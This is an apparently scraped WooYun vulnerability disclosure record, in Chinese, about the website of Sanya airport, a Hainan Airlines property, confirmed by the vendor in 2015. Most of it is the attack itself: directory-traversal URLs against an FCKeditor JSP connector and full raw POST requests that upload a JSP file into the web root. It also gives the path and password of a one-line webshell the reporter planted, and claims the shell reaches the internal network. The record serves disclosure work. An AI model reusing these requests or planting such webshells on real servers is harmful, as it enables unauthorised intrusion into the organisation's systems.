{"id": 73090, "wybug_id": "wooyun-2015-0161481", "wybug_title": "海南航空旗下某机场主站漏洞打包可内网（任意文件上传&amp;目录遍历）", "wybug_corp": "海南航空", "wybug_author": "路人甲", "wybug_date": "2015-12-15 14:09", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向公众公开  简要描述： 漏洞打包（任意文件上传&目录遍历） 详细说明：  地址：http://www.sanyaairport.com/\n\n目录遍历\nhttp://www.sanyaairport.com/autoportal//nebula/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../../\n\n\n\nhttp://www.sanyaairport.com/autoportal//nebula/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../\n\n\n   漏洞证明：  文件上传POC\nPOST http://www.sanyaairport.com/autoportal/nebula/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=../../../../ HTTP/1.0Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*Referer: Accept-Language: zh-cnContent-Type: multipart/form-data; boundary=---------------------------7de11c161e01e4UA-CPU: x86Pragma: no-cacheUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; User-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; http://bsalsa.com) ; User-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; http://bsalsa.com) (Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)Host: www.sanyaairport.comContent-Length: 219Cookie: JSESSIONID=8793B91A7AE926D92BD5C3CB1208E6FE; ubid=de7a125ecd5f996475f4f6d1632cc039009; afp_123458945=yes-----------------------------7de11c161e01e4Content-Disposition: form-data; name=\"NewFile\"; filename=\"E:\\wooyun.jpg\"Content-Type: application/octet-streamwooyun test-----------------------------7de11c161e01e4--\n这里不知道为什么，CurrentFolder要往上很多级才能传，我只好一个一个目录去试\n\n\nPOST http://www.sanyaairport.com/autoportal/nebula/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=../../../../autoweb.war/ HTTP/1.0Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*Referer: Accept-Language: zh-cnContent-Type: multipart/form-data; boundary=---------------------------7de11c161e01e4UA-CPU: x86Pragma: no-cacheUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; User-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; http://bsalsa.com) ; User-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; http://bsalsa.com) (Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)Host: www.sanyaairport.comContent-Length: 219Cookie: JSESSIONID=8793B91A7AE926D92BD5C3CB1208E6FE; ubid=de7a125ecd5f996475f4f6d1632cc039009; afp_123458945=yes-----------------------------7de11c161e01e4Content-Disposition: form-data; name=\"NewFile\"; filename=\"E:\\wooyun.jsp\"Content-Type: application/octet-streamwooyun test-----------------------------7de11c161e01e4--\n最后传到这里CurrentFolder=../../../../autoweb.war/http://www.sanyaairport.com/autoweb/wooyun.jsp\n\n一句话地址：http://www.sanyaairport.com/autoweb/wooyun(1).jsp密码：pandas\n\n\n\n可内网\n\n   修复方案：  补丁   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-12-15 14:38 厂商回复： 谢谢，我们立即安排整改。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}